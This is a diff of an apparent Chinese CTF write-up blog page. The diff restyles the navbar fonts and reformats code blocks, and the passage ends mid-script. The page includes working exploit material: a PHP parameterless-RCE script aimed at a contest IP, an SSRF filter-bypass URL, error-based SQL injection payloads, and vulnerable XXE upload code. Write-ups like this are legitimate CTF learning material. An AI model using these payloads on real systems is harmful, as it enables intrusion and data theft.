@@ -58,20 +58,20 @@
         <header>
     <nav class="navbar">
         <div class="container">
-            <div class="navbar-header header-logo"><a href="/">Lethe&#39;s Blog</a></div>
+            <div class="navbar-header header-logo"><font face="Comic Sans MS"><a href="/">Lethe&#39;s Blog</a></font></div>
             <div class="menu navbar-right">
                 
-                    <a class="menu-item" href="/archives">Posts</a>
+                    <font face="Comic Sans MS"><a class="menu-item" href="/archives">Posts</a>
                 
-                    <a class="menu-item" href="/category">Categories</a>
+                    <font face="Comic Sans MS"><a class="menu-item" href="/category">Categories</a>
                 
-                    <a class="menu-item" href="/tag">Tags</a>
+                    <font face="Comic Sans MS"><a class="menu-item" href="/tag">Tags</a>
                 
-                    <a class="menu-item" href="/about">About</a>
+                    <font face="Comic Sans MS"><a class="menu-item" href="/about">About</a>
                 
                 <input id="switch_default" type="checkbox" class="switch_default">
                 <label for="switch_default" class="toggleBtn"></label>
-            </div>
+            </font></font></font></font></div>
         </div>
     </nav>
 
@@ -80,7 +80,7 @@
         <div class="container">
             <div class="navbar-header">
                 <div>
-                    <b><a href="/">Lethe&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a></b>
+                    <a href="/">Lethe&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                 </div>
                 <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
             </div>
@@ -188,12 +188,12 @@
             
                 <div class="post-meta">
                     
-                        Author: <a itemprop="author" rel="author" href="/">Lethe</a>
+                        Author: <a itemprop="author" rel="author" href="/">Lethe</a>&ensp;
                     
 
                     
                         <span class="post-time">
-                        Date: <a href="#">March 30, 2020&nbsp;&nbsp;17:32:22</a>
+                        Date: <a href="#">March 30, 2020&nbsp;&nbsp;17:32:22</a>&ensp;
                         </span>
                     
                     
@@ -212,155 +212,24 @@
             <h1 id="签到题-EasyRSA"><a href="#签到题-EasyRSA" class="headerlink" title="签到题 EasyRSA"></a>签到题 EasyRSA</h1><p>给了flag.en和rsa_private_key.pem私钥，直接用openssl解密，得到flag{We1c0meCtf3r_elab}<br><img src="/2020/03/30/YLB-CTF-Writeup/20200327160717181.png" alt="在这里插入图片描述"></p>
 <h1 id="Web1-rce-nopar"><a href="#Web1-rce-nopar" class="headerlink" title="Web1 rce_nopar"></a>Web1 rce_nopar</h1><p>php的无参数rce，利用PHPSESSID，参考：<a href="https://xz.aliyun.com/t/6316#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/6316#toc-8</a></p>
 <p>脚本如下：</p>
-<pre><code class="python">import requests
-import binascii
-
-payload = &quot;system(&#39;cat /flag.txt&#39;);&quot;
-payload = str(binascii.b2a_hex(payload.encode(&#39;utf-8&#39;))).strip(&quot;b&quot;).strip(&quot;&#39;&quot;)
-cookies={
-    &quot;PHPSESSID&quot;: payload
-}
-
-r = requests.post(&#39;http://124.193.74.212:7905?var=eval(hex2bin(session_id(session_start())));&#39;, cookies=cookies)
-print(r.content.decode(&quot;utf-8&quot;, &quot;ignore&quot;))
-</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"system('cat /flag.txt');"</span></span><br><span class="line">payload = str(binascii.b2a_hex(payload.encode(<span class="string">'utf-8'</span>))).strip(<span class="string">"b"</span>).strip(<span class="string">"'"</span>)</span><br><span class="line">cookies=&#123;</span><br><span class="line">    <span class="string">"PHPSESSID"</span>: payload</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(<span class="string">'http://124.193.74.212:7905?var=eval(hex2bin(session_id(session_start())));'</span>, cookies=cookies)</span><br><span class="line">print(r.content.decode(<span class="string">"utf-8"</span>, <span class="string">"ignore"</span>))</span><br></pre></td></tr></table></figure>
 <p><img src="/2020/03/30/YLB-CTF-Writeup/20200327161220829.png" alt="在这里插入图片描述"></p>
 <h1 id="Web2-SSRF"><a href="#Web2-SSRF" class="headerlink" title="Web2  SSRF"></a>Web2  SSRF</h1><p>把index.php两次base64编码传入，可以返回源码的base64，里面有提示：hal0flagi5here.php</p>
-<p>然后同样的方式读取该文件源码如下：</p>
-<pre><code class="php">&lt;?php
-$argv[1]=$_GET[&#39;url&#39;];
-if(filter_var($argv[1],FILTER_VALIDATE_URL))
-{
-    $r = parse_url($argv[1]);
-    print_r($r);
-    if(preg_match(&#39;/happyctf\.com$/&#39;,$r[&#39;host&#39;]))
-    {
-        $url=file_get_contents($argv[1]);
-        echo($url);
-    }else
-    {
-        echo(&quot;error&quot;);
-    }
-
-}else
-{
-    echo &quot;403 Forbidden&quot;;
-}
-?&gt;
-</code></pre>
-<p>然后参考前一段时间“高校战役”的一道SSRF题目，使用如下payload绕过：</p>
-<pre><code>url=compress.zlib://file:@happyctf.com/../../../flag.txt
-</code></pre><p><img src="/2020/03/30/YLB-CTF-Writeup/20200327162418535.png" alt="在这里插入图片描述"></p>
+<p>然后同样的方式读取该文件源码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$argv[<span class="number">1</span>]=$_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>(filter_var($argv[<span class="number">1</span>],FILTER_VALIDATE_URL))</span><br><span class="line">&#123;</span><br><span class="line">	$r = parse_url($argv[<span class="number">1</span>]);</span><br><span class="line">	print_r($r);</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">'/happyctf\.com$/'</span>,$r[<span class="string">'host'</span>]))</span><br><span class="line">	&#123;</span><br><span class="line">		$url=file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">		<span class="keyword">echo</span>($url);</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span>(<span class="string">"error"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"403 Forbidden"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>然后参考前一段时间“高校战役”的一道SSRF题目，使用如下payload绕过：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=compress.zlib:<span class="regexp">//</span>file:@happyctf.com<span class="regexp">/../</span>..<span class="regexp">/../</span>flag.txt</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2020/03/30/YLB-CTF-Writeup/20200327162418535.png" alt="在这里插入图片描述"></p>
 <h1 id="Web3-SQLI"><a href="#Web3-SQLI" class="headerlink" title="Web3 SQLI"></a>Web3 SQLI</h1><p>几乎RCTF2015 easysql的原题，就改了个flag的位置，修改密码的地方存在二次注入，利用报错可以拿到数据。</p>
-<p>注册如下用户名:</p>
-<pre><code>Lethe&quot;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1)#
-</code></pre><p>登陆后修改密码造成二次注入：<br><img src="/2020/03/30/YLB-CTF-Writeup/20200329155336514.png" alt="在这里插入图片描述"><br>然后同样的步骤得到列名：</p>
-<pre><code>Lethe&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),0x7e),1)#
-</code></pre><p><img src="/2020/03/30/YLB-CTF-Writeup/20200329155459916.png" alt="在这里插入图片描述"><br>得到flag：</p>
-<pre><code>Lethe&quot;||updatexml(1,concat(0x7e,(select(group_concat(flag))from(flag)),0x7e),1)#
-</code></pre><p><img src="/2020/03/30/YLB-CTF-Writeup/20200329155644552.png" alt="在这里插入图片描述"></p>
-<h1 id="Web4-XXE"><a href="#Web4-XXE" class="headerlink" title="Web4 XXE"></a>Web4 XXE</h1><p>利用docx文件进行xxe，并且给了源码:</p>
-<pre><code class="php">&lt;?php
-if(isset($_POST[&quot;submit&quot;])) {
-    $target_file = getcwd().&quot;/upload/&quot;.md5($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);
-    if (move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $target_file)) {
-        try {
-            $result = @file_get_contents(&quot;zip://&quot;.$target_file.&quot;#docProps/core.xml&quot;);
-            $xml = new SimpleXMLElement($result, LIBXML_NOENT);
-            $xml-&gt;registerXPathNamespace(&quot;dc&quot;, &quot;http://purl.org/dc/elements/1.1/&quot;);
-            foreach($xml-&gt;xpath(&#39;//dc:title&#39;) as $title){
-                echo &quot;Title &#39;&quot;.$title . &quot;&#39; has been added.&lt;br/&gt;&quot;;
-            }
-        } catch (Exception $e){
-            echo $e;
-            echo &quot;上传文件不是一个docx文档.&quot;;
-        }
-    } else {
-        echo &quot;上传失败.&quot;;
-    }
-}
-</code></pre>
+<p>注册如下用户名:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lethe"||updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema=<span class="keyword">database</span>())),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<p>登陆后修改密码造成二次注入：<br><img src="/2020/03/30/YLB-CTF-Writeup/20200329155336514.png" alt="在这里插入图片描述"><br>然后同样的步骤得到列名：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lethe"||updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name=<span class="string">'flag'</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="/2020/03/30/YLB-CTF-Writeup/20200329155459916.png" alt="在这里插入图片描述"><br>得到flag：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lethe"||updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(flag))<span class="keyword">from</span>(flag)),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="/2020/03/30/YLB-CTF-Writeup/20200329155644552.png" alt="在这里插入图片描述"></p>
+<h1 id="Web4-XXE"><a href="#Web4-XXE" class="headerlink" title="Web4 XXE"></a>Web4 XXE</h1><p>利用docx文件进行xxe，并且给了源码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</span><br><span class="line">    $target_file = getcwd().<span class="string">"/upload/"</span>.md5($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $target_file)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $result = @file_get_contents(<span class="string">"zip://"</span>.$target_file.<span class="string">"#docProps/core.xml"</span>);</span><br><span class="line">            $xml = <span class="keyword">new</span> SimpleXMLElement($result, LIBXML_NOENT);</span><br><span class="line">            $xml-&gt;registerXPathNamespace(<span class="string">"dc"</span>, <span class="string">"http://purl.org/dc/elements/1.1/"</span>);</span><br><span class="line">            <span class="keyword">foreach</span>($xml-&gt;xpath(<span class="string">'//dc:title'</span>) <span class="keyword">as</span> $title)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Title '"</span>.$title . <span class="string">"' has been added.&lt;br/&gt;"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $e;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"上传文件不是一个docx文档."</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"上传失败."</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>可以看到是从docProps目录下的core.xml读取xml，所以把docx文件解压后在core.xml里构造payload：<br><img src="/2020/03/30/YLB-CTF-Writeup/20200327170815267.png" alt="在这里插入图片描述"><br>然后在压缩回docx文件：<br><img src="/2020/03/30/YLB-CTF-Writeup/20200327170910380.png" alt="在这里插入图片描述"><br>上传该docx文件即可得到flag：<br><img src="/2020/03/30/YLB-CTF-Writeup/20200327170945365.png" alt="在这里插入图片描述"></p>
 <h1 id="Crypto2-RSABackDoor"><a href="#Crypto2-RSABackDoor" class="headerlink" title="Crypto2 RSABackDoor"></a>Crypto2 RSABackDoor</h1><p>参考：<a href="https://blog.csdn.net/qq_29457453/article/details/104918136" target="_blank" rel="noopener">https://blog.csdn.net/qq_29457453/article/details/104918136</a></p>
-<p>脚本如下：</p>
-<pre><code class="python">import libnum
-import gmpy2
-
-def gcd(a, b):
-    while b:
-        a, b = b, a % b
-    return a
-
-
-def mapx(x):
-    x = (pow(x, n-1, n)+3) % n
-    return x
-
-n = 33774167600199691072470424898842928168570559940362770786060699320989546851695106466924163816843729828399984649770900793014896037884774039660562546937090412844276185560384964983508291174867808082182386566813393157054259464108858158903739578119760394228341564696225513954400995543629624209942565369972555679980359992955514826589781286738100616149226885302403505062415492679633217275379153421830105021673417544608398249866398042786421630495968810854036782025120509999022773806069591080190166920079688217334968528641747739241234353918892029263544388161160427668518991666960251381106788899451912317001247537576428186291689
-
-x1 = x2 = 1
-
-while True:
-    x1 = mapx(x1)
-    x2 = mapx(mapx(x2))
-    p = gcd(x1-x2, n)
-    if (p != 1):
-        break
-
-q = n // p
-e = 65537
-c = 0xcd979917f492a04b86057a070923bd0b9eae2f1b81c75bf5d8a8fba9fc2084c00f2a697b409578abebdabcf337382d09145630f4040b0c5ff411171e577f563c3cfb4e22639e0755f76be976f7d7e68f05f87f78f178079354b4cec2a5cbea443439420be0b850d1fb696c5dea420594ad957ba96216cdb9d8f1f316adac64bc6eac5150b02540e5232d68bb69dc04363e2115d9120af2fd1c9ff2cd7588880333608110d687b22170540861a6e2308714d54cdee5cd5d28a16e37732e44c2208251513196a63d17bd4f7a69c526c118eebfbb77cf25e5e419fef6c59c0a17132b538d945dab3553751278ef415559f2d5afc30146d277555545c4d192c5e1b4
-phi = (p - 1) * (q - 1)
-d = gmpy2.invert(e, phi)
-m = pow(c, d, n)
-print(libnum.n2s(m))
-</code></pre>
+<p>脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a % b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mapx</span><span class="params">(x)</span>:</span></span><br><span class="line">    x = (pow(x, n<span class="number">-1</span>, n)+<span class="number">3</span>) % n</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">n = <span class="number">33774167600199691072470424898842928168570559940362770786060699320989546851695106466924163816843729828399984649770900793014896037884774039660562546937090412844276185560384964983508291174867808082182386566813393157054259464108858158903739578119760394228341564696225513954400995543629624209942565369972555679980359992955514826589781286738100616149226885302403505062415492679633217275379153421830105021673417544608398249866398042786421630495968810854036782025120509999022773806069591080190166920079688217334968528641747739241234353918892029263544388161160427668518991666960251381106788899451912317001247537576428186291689</span></span><br><span class="line"></span><br><span class="line">x1 = x2 = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    x1 = mapx(x1)</span><br><span class="line">    x2 = mapx(mapx(x2))</span><br><span class="line">    p = gcd(x1-x2, n)</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">q = n // p</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">0xcd979917f492a04b86057a070923bd0b9eae2f1b81c75bf5d8a8fba9fc2084c00f2a697b409578abebdabcf337382d09145630f4040b0c5ff411171e577f563c3cfb4e22639e0755f76be976f7d7e68f05f87f78f178079354b4cec2a5cbea443439420be0b850d1fb696c5dea420594ad957ba96216cdb9d8f1f316adac64bc6eac5150b02540e5232d68bb69dc04363e2115d9120af2fd1c9ff2cd7588880333608110d687b22170540861a6e2308714d54cdee5cd5d28a16e37732e44c2208251513196a63d17bd4f7a69c526c118eebfbb77cf25e5e419fef6c59c0a17132b538d945dab3553751278ef415559f2d5afc30146d277555545c4d192c5e1b4</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure></p>
 <p>运行得到flag：<br><img src="/2020/03/30/YLB-CTF-Writeup/2020032717243017.png" alt="在这里插入图片描述"></p>
-<h1 id="Misc3-Keyboard"><a href="#Misc3-Keyboard" class="headerlink" title="Misc3    Keyboard"></a>Misc3    Keyboard</h1><p>先执行下面命令：</p>
-<pre><code class="bash">tshark -r u.pcapng -T fields -e usb.capdata &gt; usbdata.txt
-</code></pre>
-<p>网上找到下面脚本：</p>
-<pre><code class="python">#!/usr/bin/env python
-# -*- coding:utf-8 -*-
-
-normalKeys = {&quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;, &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;, &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;, &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;, &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;, &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;, &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;,&quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;=&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#39;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;,&quot;38&quot;:&quot;/&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;}
-shiftKeys = {&quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;, &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;, &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;, &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;, &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;, &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;, &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;{&quot;,&quot;30&quot;:&quot;}&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\&quot;&quot;,&quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;}
-output = []
-keys = open(&#39;usbdata.txt&#39;)
-for line in keys:
-    try:
-        if line[0]!=&#39;0&#39; or (line[1]!=&#39;0&#39; and line[1]!=&#39;2&#39;) or line[3]!=&#39;0&#39; or line[4]!=&#39;0&#39; or line[9]!=&#39;0&#39; or line[10]!=&#39;0&#39; or line[12]!=&#39;0&#39; or line[13]!=&#39;0&#39; or line[15]!=&#39;0&#39; or line[16]!=&#39;0&#39; or line[18]!=&#39;0&#39; or line[19]!=&#39;0&#39; or line[21]!=&#39;0&#39; or line[22]!=&#39;0&#39; or line[6:8]==&quot;00&quot;:
-             continue
-        if line[6:8] in normalKeys.keys():
-            output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==&#39;2&#39;]
-        else:
-            output += [&#39;[unknown]&#39;]
-    except:
-        pass
-keys.close()
-
-flag=0
-print(&quot;&quot;.join(output))
-for i in range(len(output)):
-    try:
-        a=output.index(&#39;&lt;DEL&gt;&#39;)
-        del output[a]
-        del output[a-1]
-    except:
-        pass
-for i in range(len(output)):
-    try:
-        if output[i]==&quot;&lt;CAP&gt;&quot;:
-            flag+=1
-            output.pop(i)
-            if flag==2:
-                flag=0
-        if flag!=0:
-            output[i]=output[i].upper()
-    except:
-        pass
-print (&#39;output :&#39; + &quot;&quot;.join(output))
-</code></pre>
+<h1 id="Misc3-Keyboard"><a href="#Misc3-Keyboard" class="headerlink" title="Misc3    Keyboard"></a>Misc3    Keyboard</h1><p>先执行下面命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r u.pcapng -T fields -e usb.capdata &gt; usbdata.txt</span><br></pre></td></tr></table></figure></p>
+<p>网上找到下面脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">normalKeys = &#123;<span class="string">"04"</span>:<span class="string">"a"</span>, <span class="string">"05"</span>:<span class="string">"b"</span>, <span class="string">"06"</span>:<span class="string">"c"</span>, <span class="string">"07"</span>:<span class="string">"d"</span>, <span class="string">"08"</span>:<span class="string">"e"</span>, <span class="string">"09"</span>:<span class="string">"f"</span>, <span class="string">"0a"</span>:<span class="string">"g"</span>, <span class="string">"0b"</span>:<span class="string">"h"</span>, <span class="string">"0c"</span>:<span class="string">"i"</span>, <span class="string">"0d"</span>:<span class="string">"j"</span>, <span class="string">"0e"</span>:<span class="string">"k"</span>, <span class="string">"0f"</span>:<span class="string">"l"</span>, <span class="string">"10"</span>:<span class="string">"m"</span>, <span class="string">"11"</span>:<span class="string">"n"</span>, <span class="string">"12"</span>:<span class="string">"o"</span>, 